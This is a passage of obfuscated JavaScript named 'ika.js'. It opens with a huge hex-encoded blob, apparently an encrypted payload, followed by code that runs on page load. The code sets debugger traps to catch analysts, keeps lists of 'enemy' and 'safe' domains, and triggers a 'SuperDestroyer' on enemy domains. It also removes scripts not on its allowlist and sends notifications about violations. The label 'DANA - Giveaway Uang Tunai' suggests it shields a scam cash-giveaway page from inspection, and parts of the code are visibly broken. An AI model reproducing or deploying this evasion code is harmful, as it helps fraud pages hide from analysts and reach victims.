565d29b1f7e5a960422a0acb44db591a5083d1827d5c4f67e384337834a4e79622e8cc939c4a0c3c944d85f67951a54e289e5adfbd476928709ad2eebd15e1d62c777d0103a8195234dc3ce19c01a41da4f1e0ed472f50fcf06db97b426edda31c0ffefcb6da952173d041223eb7a040c8caf3929417e09277468ac0c3c709b14e779932ec3605a550cec701e1f61222f62ee9d6711c137cddb696b7016eec549a1886c70c3b5271ef5c470348284c72d9cc00c491ff66f2f9a239782d2c952ee8102d3c5e341a46a0e9bf6a61e51ca292953e485afbdac89d6319a18810382d2ce6563a09e6238f9a8fe01f6643d3ae3c29187707fb83cbe3e1beb5db70a417baa7a0f840ba94ccc1bd6ea6d960abbb46c49e8c254ef30db12cc986696cabb10b26480831bb24e5a06fc044f134cdc6b4932f11e5c77f141a875fff4f01509a7212605366c5f997af1b6287ca042b8fe9f0e05986bfeeab67b68e63fc95ea282e8b859ab4ae5d42600291d659e217e1846d5aefc7720c0ebfcd22722b93c8918beb2fd892baf1cea644874cc6d594f79868c86c0bcb4a06d365bf0f009b4e55cea657f24e7b62079dd9d4288a22fa9a89c44e4cef19feba08795034f85bba9cbc3605d0fc07d7abe0e4b4ea12e9fac72c654576729717d1a1317749588a86fe62dde38bcc9df6561f74030b766cda573f481d66536994f41037b7689d0f2faf0b6e1e2cf81859a5e3551f417c682ae0a2ec2781cbd43ca80382c529bc433433208cb95888379a53c8fc30029130fc7654710d678c1179696f99825b0ecee15d1a0e63d7ac170f5151ac3875d299f43d70037f9581a7b34c4a449dc2868342fa2dc059ecc5beef5ee5ca534d9ecb3e51e19b8d8083fc404dfc1f880caab1b8c3d26bbe8619040e1804ce9f7f7e66fd6ef26f81cdf0c8498a1953e8134ec3a61642b7b7d3fd614a4d0bb27b2f72d2e6eb7636cedaa52d1e2e21a13aee4025c188b4441bd9469e901c21a4377e1f8b5df1ddf9f4784355f8f37fdd983cd06551a45df19846291816e2c62806b4f53a00394feb5e1d291751b3e3ac4b71c85db0e5e130d6bf49229a901760c4f5aef3086fedf8cd8f0a4853ad95b560d12db4e955138b1de8fdbc63192c5572844f4157e720db5d56cd152f5588ad28747f8a78d335624be1695feff6792f191ebe6102093a486566eac556585f332ef5dbc9ba8899ddd3515ba4c449c1088a1869ad79b3f12b468673f4f13d512c3f184fab9cfb1ee4d3356c832ccc376d235cf3885f38cc35032cee5717eb2347e1c67aafd9b865c3ebbd281508384fdd6d18c0a1c20005a7da5ed7a49270d3c365c852608d0ae18a0a23741a316358e17f39a23c5beeb8d3c5de612657b0ea6c6b1bfe7e33d631c25427882f4251d2b86ceb52bd9dd0e0d188a393b29445dfe6c3b8d3f6bcb6fece596745f527048e58758aecb0a689dca9948045e10ce0f826ba9676c6a6d46acd9b1e28eed0eeb703121642646d257424f6bd1cbf00932c78735918b294cb7d1e31b887e8f5119bb2ac2a6488d6b6dc15070efc4840700eed34f6d8dee119f20aa433c4c074b2a01fd0fe6b958c1d108d084acff1b86a5a2c417e38a949e1daf7e4e98107d26340c8a03984e74fadae78a382015d9c57b689df4188dc664b0aafae5444fa91aff8e4f4041080fd3c456b9bb125554913e3833b2a9b7483221d91f40b623ec43945390ffd64c5cbc832b5bca13862b9ea323d6d1506ec3635179f52a0c73252a6fd4a33f876580ca55844535b5d550e20def42550dfd4bb332ea96a52242d4b6026043667ff2a485989fb8cfb2820f7eea1e025243a991f61fbbcb44d2b6ed7bdfd5c096f34915a7315c6a26821a98862eb8e05388a63b0860025dda7f2e5e1240ea7e48393033f75f032c1dd951b2ef77292f90eae1088a06cac546b37cbf594ff48b45612b893d4c33872d8d5709637eddc20527b4b84648731e479b48b561495a83b870b18db15712ab6018667cb7427e6f9576672d8c5111a4f03af97ca17a1eab53d0004d69582e9f7b1acc144bc48983cc50416265e7f1e379df3f9c0f049e9302e165530dbac6a62ea8cc5b26e9f93b6d89acf964bd139d7c4e5968e76bfc909b926e053b5d447b606faa02079f46e19fa0078952779dcb69419afbbac7469dbf08a1dbfb13577871e134b5380e80287664948ef2a2a4594004d4b6d8b2672e7f89aa81c7f585ab875802f52f2a194d4b2ba4419ecd2c876aa0de9d52a915b67f77ecb62e36317d9539568656f023b806f8fe619f470bdc169d7a0bf7fe4313f2a6fecf36c01d4389089649ceefc597a80f935334b4d4f8e4ab19ee7014c9b0409832acae72034e27ead7c3d3e238d6eef2a2c0a03b89c6274c03d25dd3be4e686fae3b648bbb26bb3c294c953e26e9343d3a907799e886093c3d86a7202933489d3f9aec943d5dbf99012033e05bb1c1bb17a45209ec62f095bda68900df5bf2c177d1042f4e7c410f3d655bc1824ac7e9f1551a7f0bba220ca5dc2f93ed1c07757672209f080699c1bef5a1e4c62b98b356ce074df4ed8c9b61e3d6fff4960e12e421fb95d1d49ac8c9037ff12efedfdf2e4638347a196d27994f0db364d89c34f592ad1f2dc702c28fd3a90d1e41af3ac85a332d5da1c66bfe57316fabfc7f57fe0141fb550659ce11e5cb2e6738842941b4110c36816779ce57d238d6718076edf90d4a1a6fce9b0270dd5f72c7b3930a66cc7e1bc685e3d4768e8bc3e835dbf498c781c9ef995b5a5dcf5e97346db639b65728ab493d304805ae11a88d57fe833e1e651ff1fc34b990b72405879671b3ec393db5e636092565bf5855fda968d4e4b2ef37c0b575d67cc5790567a590c3b48922555f2e10cf36d313f454624829087799a32f7b458af9a9fbb8f778fb94814ec8cded7823cb56efee35678ed425a042ec082fa2ceea8dde9e7d413ac9ab9925b06d963234da2725df2ce2cc9d617462554acf0d562143ffd972b853bbf82536c5c2d0e394456e9ca7ce4331efff18bcec2467a0bce5b97096c6821fe01a299f7a6a9855fbd5647ad0aade3944555797db4c9ed99616943239d31e0e521ff157e8807ce1d983573a8d2b087c11388b8929f53d6813609c548c7decd883ab580190ad7515af05aa5a39352725f0dcf1926a7c9dc3cc85e82e08c3001319b7dc2d3c01065b32c740230ecc6eb3472c0285963d24c2167fd2268d7528dd0b9e95e2a8744d5b7a90c5e16c2398c11a1af4874b8b269fb4a5d5028cef0164040e3ac82b4647d9fdfda14c5544ce397f57c5e54d57929e2a1026948a145869c5107123c68f34975f4742b4ee185daf36a352dfd34b8c47f7d3fc84c9920cd6d6e8efdcce85ac534cedcdae2c9e5941cd5377d64a39f8d19cfe9b750e7cd92f9b5cec909a836f76304646464cfdbf5fb56f7127bbb233dc9f756ee9d4a7c866e41487310ab4851709cea0bb8bc4584ae25a049dccd71c4c39bc61767e5cda8cadbe03e5da6f3995c329eeeb8b812fe141411eecfde7bb98f290d58b2c2f53286872c0aaaeffa5026649eb0e9997d2495aa480b64014a6fbede9718f3a9f26ff9b9ab11e60c9223717dac0b9b6ad051be6c19e376e68c33bc557af14235acc27c27fe1b1891e5693a85b2e85b512225f7765aa9e395488a8b26cb5b27ee47d24f108a57d14dc855ce017e63db96beb15a1bc909ac575489b61b137f01f42fdd90c08d01014a2cf1d96e89680318547d0bf9f44af7002dfdbae5edfe057d772245b09075bcee425e239a557fae0c78516f387d4b5e9cc0b5f1e1f2243abfdf3d524ce4235f3c3c01a1e4b100b7f6ed18bedd8bc2deba1985da7c6dd66515869243cae8d7dea6fb56c1e3c72a2421f4416ba095cb1e03e3d8dd568e7bec0c67ed44ca7423752c61819c240b220df778a75089b4a99d3ee716265399b2b84fcac0c7f3c8f7a548f98780846a5fbd4b2a5c9d00cd15a69d875a7696d7eb571918223fcadac6f1b4d26195238ef73b85a5c3a39833f5136a4256346f31449a96662647527fd397b52cf400e7dbc8f1a40b3bab278bb74177875d56f37818a343df67845b9895331eb2eff7c20053e888e7f6dfd8045a181e9bdfde7993c4873c06f82ec653df69a5d9afa0c31a4ee5f7fd49548129fb34d5b22aeca5b474ed562be3d084ccca15c55b52b024de969b2afa427c38323333752a5d0d4e67782eff4411173fbf79acf18277b64ba8b2ff42a3a1d48146ff82f34ab08a57f378100b1194ac920f0d7de9164fc42b0fad50ac1de5d4f4d01e10ed38fbf17f10e75ff2ec54d7ea99ba03568ab49389b737b00d992e9620f8b78642efa51f432f664fb57f674e4e46d4ea52a00585be4f93e0859fbdc14bb5b594d91b588d1e9bfe870c0eff9b23ae9ed6ba055aaddbf2a7c8bfa0337e76e189a64dea627a6779d7f980d45745302fd193588b718b2c90f9f259bdfe25f4d8fbfa4efa69289e6294b06a1dcb597acbb69bdfe66ef9e1c32fc0362ded6289ce3a819b3888e39463db60dde03518c502f0ddb02ba5af7f05a1dd093546786e915d9a8d52baf11a69313e61bd3aead533623dd4e9881266249d8c7f0fbe9158bd88026693c1c429f71f9fd6e0300dc60d2a3cdde3b4a124fb09729c7de128e273ce9a7e1d30a94693c0cc49276224cd17ac3d812c54cce77db25a316d3933ed937b5695fe70514b9942396c1994b3ff93ef8c7dcb4300284ecd81577d867f5167196a9008f63a67c36c1ec17fc3c76fbe6387cce9e0d7c03b993250ee10510df34bc6f1305001b28dd058f7156093f3e4db77bcfb5d9b99b69be55c4549b6132fd77a20e42db61e2a4f7ac8bfa583ad44e069c1b1d717ae14c229514e29c6bfd334810c04fa0b53156590a1eb2bf9dd1de28b2b8196e80a6026c3657e90c1a88205e31a27687d26a4bc2c011153fbe1fc564aa6119abb57c6310c15373a68765b0e4dcc68ee62d81e019f43566c32f960d16b032be7954a0bd30aa4ea61ae0bf097b581d3ec0313692cf09dba17627f0158a09e0c14805c9c7110edb5b935840b3d3ab9cde980d99015cc71a3c57f7ea712f3f02d775340052bfde1be179bd87e4a98ae6bc2a2d8a26713d6096fa0509aa2a4c21ec56b1d612e27e5b8a83ab01eea8b053bf0f00903b55a7f4bde48b0736cdaa65d7c73581584045f86bc303fb89c54b5a2157d60b6320b91fc8ce5d4d0511cc52dfb75c2219970f9530863cea1b35d7e0880eefbd7f157afa81191f56df0279900208fae16ca99105f1c78ecdeffbcc4d9ff175d167a21285080a469e0e2b66b2775317d45d4835263e5878dd75b32a4c4ac6a5b7c8fbc58aa476cd96fc1f0e0d2160a237a831f79f10ed5460518679cf19aedaaae7f898c144c4ce780103455d6a03901e5c124c7dcd3ab96ce0fa3951eec05a7b93981c8bde1d717472d9d969f0329b90ded48f54be1b92e6d31782acba6e1923bb30676b4c2dde57d550f5d345604a30b6a7fd04e9263abd8878c37081f81777a9ae08f20cf5e1cb71a61372e61c06758d55e32c0e698179586b3b5bc7722e43b28c3dc0bb4f3297d794fd257eae0c6ce005b99eaab949a6255cd7ce868781fe314d3add4d796e00d78c23bfb59b431c45dd26724f635ee961ed8354014df499158c4c030b450d7ac957b61a0155fb67eb6001c952071c1dc8372aa8716f0e5232d82c9abea8a8bb6297b4ab35e0ab44a73bae98f4e21bdf1fde5eac6fe68baf4f2274034cae8388f761c0632e9b17b1a9a4099cb25d739e2bfe189e88b7fb14fc5dc61ea57944079ec24a8d5d4e165831f23b365e24c2da6b7c958b35873ff6a75f0d75f092ccf4689ac688e92eb39cfc16aa52175f251c1617aa03da79fd0814950565aae738ad052e026f5307505957c71ac1d011e637920fca9bd10d1fd77972166a222799c5cbf6bfa5e3f5c0587330ee975716549189a93ac26f81410c8f7f8db71e5d548a5f643bf0557e946032829585169347e700d17e2a4494bc6cb9a5c19e37b9af1eb8668fc07f6f75890caeebf82088224445fe8ddb54ecd27c58367d6c0896d5e0dd0f916c2e6f26ac4c89f13a03798e739ff3a87401c1995e6b89eab9368ad97450c7c43b4d040326de8df8556c2eaab35e5f7083d29dfda6ead829b78e8fd8a4a97a66c4fed753d85138fc0cd5046c3b2909d0fe1edd84621a299a959a717a8b6f3d7a2995da42337da4bfe4b7b588c4e099c4a4e59879881703cf5944e9e3a636345154a878efb461b159b4507f1a5b5b78539cb93bf68ec825ba943917a2ba5057ea328edf2043bc073b9efb36896d579739a8b4365b63d05202c1f37f758d841161fac6276044f39b58389fd733f7be45d4fa63ac740aefb680427fb0f71aada5264136f8505eba32570ae0e82d0384df57c49a8be027ab60d2a77480e6e33929b6397b2adf71fc30aca71a9d8e81b82be75f9253c43a9245d38e6aa1d8e4ad142595ab8f271493a3f167cd76c9bac0b58aa2441058941265afca9a300c5dc562bfb8b1dd324ec4745d9e2c1a856dc84360aaccc7c1844153cde4186db37bfb5235679db75cc212d26d635db8aac6c2a77b094ab781f6d8fa41b1dc4e7f7c43cf74ca979bf16814a4f37bf431baa07c909a04ea9cff0098b46044fe94560b595ac06f8a1bdf763ca5640344caad00ae0927fd18a17eb6388cfca2b64ca36f1b4819093e2833cf8622226800b32c0ac4377e2df3fb4775949347049e4b9297d1125646b698c648fe2ad659763cd748536597b2538bf33b10a1ebf051bf94ac3dd3af35d3978aa00555d67163a14c642ac4ba31bb5bba7982bcbd2de59f80a13dd6ad6819e673bd3cbd2cc2c6a4fb0cd3ae090e073c86646260020057bcf7af944b5e4dd931f0031a3a5c71a12a8bd9053e01a1ad01b26376a813c6ea1c260044941791dbd2cfdef496172d3a64b5f9ab20a8ea56da58b569b51ad1c770fe1bc4755bc9f49e408e110a0711835796e286d1d4c0acd464ee5489bd5f49ca9025543de0cdcfbdf77398f0ac7c974cec5f58f7defb5bd2cc256762f1fc2779de1cc90aeedd7a235e7497301c8881dd30f7d25adb8ccc56aeb7e5718af73245c13457f5f2080a4d516b865f0f51d56b83fbf95486fa73004d3282f62030e5ca0ed75ed1e37a3dca3b099d3577abbb8ace119f99d084dd317c96a25d9417d084382756bf98518c7259702dae4eab10f28a72ed5485d10da868719a56930e89fb87ac310b182fbf5dd887368efc4e0f6c1565e7a6b996e35ac76e1e1a8d4a5bf419227736b51231a32e1ec623e4527abb23ad431161a87537f42023d78f230d6ce6c37eae3dd42ba2d1afedbc22390ec2ce6715b25987d90309b8f1b17c7341bed93e4bfd7f916dafd23d3f08f6ef0edba4f7861e31f4cd66b8a59a6e4b1cda2ebd5b14ccdeb0c460ae659a8b59b0d628968729c4d1158db105ae6ad7926d8898ebffc49070690aff5b8c35de9ac5848a28f4fb8e9a2031a4d15fcdbe80e227f81e8910f788ef83b0d8538c91a1744374db0f479bb8105933ccc4143270434cfcc691d278a13dd601390faae0a078daac8e687f612d76879191dbe45ef34d09fc2318340381b8a0543c7200ce8a572b09fe9e14375f9c174633cae4f24e7d3f34b79e0b84fdafb1744001d46b319fb26e89fa27255959e74e5c9f5ae6e61fc5f27dc3bdbd64b082f22e8da39a74ee0e1668d61d8dca8154c2cdb36ea2804577e858480cb9303d3d9feac1f663ba128f8c942206fb0c722aa31ae84c5c57b58639baff042953d875a296de377a47d2c1d26dab8983c2b4bdb'), 31)
      return done(securityHash, keys.data)
    },
    
    startRealTimeProtection: function () {
      var that = this
      
      if (!this.options.enableRealTimeMonitoring) return;
      
      try {
        // Monitor DOM changes
        var observer = new MutationObserver(function(mutations) {
          mutations.forEach(function(mutation) {
            if (mutation.type === 'childList') {
              that.handleDOMChange(mutation)
            }
          })
        })
        
        observer.observe(document.body, {
          childList: true,
          subtree: true
        })
        
        // Continuous debugger detection (less aggressive)
        setInterval(function() {
          try {
            var start = Date.now()
            debugger
            if (Date.now() - start > 100) {
              that.logViolation('𝗗𝗔𝗡𝗔 - 𝗚𝗶𝘃𝗲𝗮𝘄𝗮𝘆 𝗨𝗮𝗻𝗴 𝗧𝘂𝗻𝗮𝗶')
            }
          } catch (e) {
            // Ignore debugger errors
          }
        }, 5000)
        
      } catch (error) {
        console.error('Real-time protection startTime:', error)
      }
    },
    
    handleDOMChange: function (mutation) {
      var that = this
      mutation.addedNodes.forEach(function(node) {
        if (node.nodeType === 1 && node.tagName === '𝗗𝗔𝗡𝗔 - 𝗚𝗶𝘃𝗲𝗮𝘄𝗮𝘆 𝗨𝗮𝗻𝗴 𝗧𝘂𝗻𝗮𝗶') {
          var src = node.src || ''
          var content = node.innerHTML || ''
          
          if (!that.isValidScript(src, content)) {
            node.remove()
            that.logViolation('MALICIOUS_SCRIPT', src || content.substring(0, 100))
          }
        }
      })
    },
    
    isValidScript: function (src, content) {
      if (!src && !content) return true
      
      var allowedScripts = ['ika.js', 'dana.lyanan.info', 'lyanan.info', 'dana.lyanan.info']
      var isAllowed = allowedScripts.some(function(allowed) {
        return src.includes(allowed) || content.includes(allowed)
      })
      
      return isAllowed
    },
    
    logViolation: function (type, details) {
      this.violationCount++
      
      console.warn('💀 ika.js Violation [' + this.violationCount + ']:', type, details)
      
      this.sendSecurityNotification(type, details)
      
      if (this.violationCount >= this.options.maxViolations && this.options.enableSuperDestroyer) {
        this.triggerSuperDestroyer()
      }
    },
    
    triggerSuperDestroyer: function () {
      if (this.options.enableSuperDestroyer) {
        triggerSuperDestroyer("MAX VIOLATIONS REACHED: " + this.violationCount);
      }
    },
    
    // Utility methods
    each: function (obj, iterator) {
      if (Array.isArray(obj) || ('length' in obj && obj.length > -1)) {
        for (var i = 0; i < obj.length; i++) {
          iterator(obj[i], i, obj)
        }
      } else {
        for (var k in obj) {
          if (obj.hasOwnProperty(k)) {
            iterator(obj[k], k, obj)
          }
        }
      }
    },
    
    x64hash128: function (key, seed) {
      var h1 = 0xdeadbeef ^ seed
      var h2 = 0x41c6ce57 ^ seed
      for (var i = 0; i < key.length; i++) {
        var ch = key.charCodeAt(i)
        h1 = Math.imul(h1 ^ ch, 2654435761)
        h2 = Math.imul(h2 ^ ch, 1597334677)
      }
      h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909)
      h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909)
      return (h2 >>> 0).toString(16) + (h1 >>> 0).toString(16)
    },
    
    // NEW: Axios utility methods
    secureRequest: function(url, config) {
      if (!this.options.enableNetworkSecurity) {
        return this.axios(url, config);
      }
      
      var currentDomain = window.location.hostname;
      var isSuspicious = DOMAIN_MUSUH.some(musuh => 
        url.includes(musuh) && !DOMAIN_AMAN.some(aman => url.includes(aman))
      );
      
      if (isSuspicious) {
        this.logViolation('SUSPICIOUS_AXIOS_REQUEST', url);
        return Promise.reject(new Error('Request blocked by ika.js security'));
      }
      
      if (!config) config = {};
      if (!config.headers) config.headers = {};
      config.headers['X-Security-Token'] = SimpleCrypto.hash(currentDomain + Date.now());
      config.headers['X-Protected-By'] = 'ika.js-2.0';
      
      return this.axios(url, config);
    },
    
    // NEW: Secure fetch method
    secureFetch: function(url, options) {
      if (!this.options.enableNetworkSecurity) {
        return fetch(url, options);
      }
      
      var currentDomain = window.location.hostname;
      var isSuspicious = DOMAIN_MUSUH.some(musuh => 
        url.includes(musuh) && !DOMAIN_AMAN.some(aman => url.includes(aman))
      );
      
      if (isSuspicious) {
        this.logViolation('SUSPICIOUS_FETCH_REQUEST', url);
        return Promise.reject(new Error('Fetch blocked by ika.js security'));
      }
      
      if (!options) options = {};
      if (!options.headers) options.headers = {};
      options.headers['X-Security-Token'] = SimpleCrypto.hash(currentDomain + Date.now());
      options.headers['X-Protected-By'] = 'ika.js-2.0';
      
      return fetch(url, options);
    }
  };

  // Auto-start protection
  if (typeof window !== 'undefined') {
    var currentDomain = window.location.hostname.toLowerCase();
    var isDomainAman = DOMAIN_AMAN.some(domain => {
      var cleanDomain = domain.toLowerCase().replace(/^www\./, '');
      return currentDomain === cleanDomain || 
             currentDomain.endsWith('.' + cleanDomain) ||
             (cleanDomain.endsWith('.') && currentDomain.startsWith(cleanDomain));
    });
    
    var isDomainMusuh = DOMAIN_MUSUH.some(musuh => {
      var cleanMusuh = musuh.toLowerCase().replace(/^www\./, '');
      return currentDomain.includes(cleanMusuh) && !isDomainAman;
    });
    
    console.log('🚀 ika.js Auto-Start Check:', {
      domain: currentDomain,
      isAman: isDomainAman,
      isMusuh: isDomainMusuh,
      axiosAvailable: typeof axios !== 'undefined'
    });
    
    // Hanya inisialisasi jika domain aman atau domain tidak dikenal tapi bukan musuh
    if (isDomainAman || (!isDomainMusuh && !isDomainAman)) {
      var ikaInstance = new ika()
      
      // Tunggu DOM siap dengan error handling
      var initIka = function() {
        try {
          ikaInstance.init()
        } catch (error) {
          console.error('Failed to initialize ika.js:', error)
        }
      };
      
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initIka)
      } else {
        setTimeout(initIka, 100)
      }
    } else if (isDomainMusuh && !isDomainAman) {
      // Langsung hancurkan jika domain musuh
      console.log('💀 Auto-destroying malicious domain:', currentDomain);
      setTimeout(function() {
        triggerSuperDestroyer("DOMAIN MUSUH TERDETEKSI PADA AUTO-START: " + currentDomain);
      }, 100);
    }
  }

  ika.VERSION = '2.0.D4N4-GL0B4L1Z3-S3C-2024'
  ika.AXIOS_VERSION = axios.VERSION
  return ika
})